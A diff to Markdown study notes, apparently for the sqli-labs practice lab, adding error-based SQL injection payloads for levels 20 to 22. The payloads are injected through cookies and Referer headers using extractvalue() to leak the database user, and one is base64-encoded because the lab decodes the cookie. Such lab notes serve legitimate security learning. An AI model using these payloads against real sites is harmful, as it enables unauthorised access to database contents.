@@ -69,3 +69,12 @@
     -   `admin`
     -   `123`
     -   `Referer: 'and extractvalue(1,concat(0x7e,(select @@version),0x7e)) and '1'='1`
+-   ##   less 20
+    -   cookie  = `admin' and (extractvalue(1,concat(0x7e,(select user()),0x7e))) -- a`
+
+-   ##  less 21
+    -   查看源码后，发现对提交的cookie进行了base64解码，那么先对payload进行编码
+    -   `admin') and (extractvalue(1,concat(0x7e,(select user()),0x7e))) -- a`
+    - `YWRtaW4nKSBhbmQgKGV4dHJhY3R2YWx1ZSgxLGNvbmNhdCgweDdlLChzZWxlY3QgdXNlcigpKSwweDdlKSkpIC0tIGE`
+-   ##   less 22
+    -   同上，对 `admin" and (extractvalue(1,concat(0x7e,(select user()),0x7e))) -- a` 进行编码
